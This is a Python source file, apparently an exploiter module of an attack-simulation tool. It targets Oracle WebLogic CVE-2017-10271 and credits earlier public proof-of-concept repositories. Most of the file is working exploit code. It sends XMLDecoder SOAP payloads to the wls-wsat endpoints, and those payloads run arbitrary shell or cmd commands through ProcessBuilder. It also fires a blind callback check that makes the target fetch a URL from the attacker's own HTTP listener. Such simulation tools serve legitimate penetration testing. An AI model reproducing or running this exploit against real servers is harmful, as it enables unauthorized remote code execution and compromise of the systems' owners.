# Exploit based of:
# Kevin Kirsche (d3c3pt10n)
# https://github.com/kkirsche/CVE-2017-10271
# and
# Luffin from Github
# https://github.com/Luffin/CVE-2017-10271
# CVE: CVE-2017-10271

from requests import post, exceptions
from web_rce import WebRCE
from exploit.tools import get_free_tcp_port, get_interface_to_target
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from model import POWERSHELL_HTTP_UPLOAD, WGET_HTTP_UPLOAD

import threading
import logging
import copy
__author__ = "VakarisZ"

LOG = logging.getLogger(__name__)
# How long server waits for get request
SERVER_TIMEOUT = 4
# How long to wait for a request to go to vuln machine and then to our server from there
REQUEST_TIMEOUT = 2
# How long to wait for response in exploitation
EXECUTION_TIMEOUT = 15
# Server might get response faster than it starts listening to it, we need a lock
LOCK = threading.Lock()
URLS = ["/wls-wsat/CoordinatorPortType",
        "/wls-wsat/CoordinatorPortType11",
        "/wls-wsat/ParticipantPortType",
        "/wls-wsat/ParticipantPortType11",
        "/wls-wsat/RegistrationPortTypeRPC",
        "/wls-wsat/RegistrationPortTypeRPC11",
        "/wls-wsat/RegistrationRequesterPortType",
        "/wls-wsat/RegistrationRequesterPortType11"]
# Malicious request's headers:
HEADERS = {
            "Content-Type": "text/xml;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
          }


class WebLogicExploiter(WebRCE):
    _TARGET_OS_TYPE = ['linux', 'windows']

    def __init__(self, host):
        super(WebLogicExploiter, self).__init__(host, {'linux': '/tmp/monkey.sh',
                                                       'win32': 'monkey-32.exe',
                                                       'win64': 'monkey-64.exe'})

    def get_exploit_config(self):
        exploit_config = super(WebLogicExploiter, self).get_exploit_config()
        exploit_config['blind_exploit'] = True
        exploit_config['stop_checking_urls'] = True
        exploit_config['url_extensions'] = URLS
        return exploit_config

    def exploit(self, url, command):
        empty_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3" >
                    <void index="0">
                      <string>{cmd_base}</string>
                    </void>
                    <void index="1">
                      <string>{cmd_opt}</string>
                    </void>
                    <void index="2">
                      <string>{cmd_payload}</string>
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        '''
        if 'linux' in self.host.os['type']:
            cmd_base = '/bin/sh'
            cmd_opt = '-c'
            command += ' 1> /dev/null 2> /dev/null'
        else:
            cmd_base = 'cmd'
            cmd_opt = '/c'
            command += ' 1> NUL 2> NUL'

        payload = empty_payload.format(cmd_base=cmd_base, cmd_opt=cmd_opt, cmd_payload=command)
        try:
            post(url, data=payload, headers=HEADERS, timeout=EXECUTION_TIMEOUT, verify=False)
        except Exception as e:
            print('[!] Connection Error')
            print(e)
        return True

    class HTTPServer(threading.Thread):
        """
        Http server built to wait for GET requests. Because oracle web logic vuln is blind,
        we determine if we can exploit by either getting a GET request from host or not.
        """
        def __init__(self, local_ip, local_port, max_requests=1):
            self._local_ip = local_ip
            self._local_port = local_port
            self.get_requests = 0
            self.max_requests = max_requests
            self._stopped = False
            threading.Thread.__init__(self)

        def run(self):
            class S(BaseHTTPRequestHandler):
                @staticmethod
                def do_GET():
                    LOG.info('Server received a request from vulnerable machine')
                    self.get_requests += 1
            LOG.info('Server waiting for exploited machine request...')
            httpd = HTTPServer((self._local_ip, self._local_port), S)
            httpd.daemon = True
            LOCK.release()
            while not self._stopped and self.get_requests < self.max_requests:
                httpd.handle_request()

            self._stopped = True
            return httpd

        def stop(self):
            self._stopped = True
            return

    def check_if_exploitable(self, url):
        local_port = get_free_tcp_port()
        local_ip = get_interface_to_target(self.host.ip_addr)
        httpd = WebLogicExploiter.HTTPServer(local_ip, local_port)
        httpd.daemon = True
        LOCK.acquire()
        httpd.start()
        LOCK.acquire()
        generic_check_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.8" class="java.beans.XMLDecoder">
                <void id="url" class="java.net.URL">
                  <string>http://{lhost}:{lport}</string>
                </void>
                <void idref="url">
                  <void id="stream" method = "openStream" />
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
         <soapenv:Body/>
        </soapenv:Envelope>
        '''
        payload = generic_check_payload.format(lhost=local_ip, lport=local_port)
        try:
            post(url, data=payload, headers=HEADERS, timeout=REQUEST_TIMEOUT, verify=False)
        except exceptions.ReadTimeout:
            pass
        except Exception as e:
            LOG.error("Something went wrong: %s" % e)

        LOCK.release()
        httpd.join(SERVER_TIMEOUT)
        httpd.stop()
        if httpd.get_requests > 0:
            exploited = True
        else:
            exploited = False
        return exploited
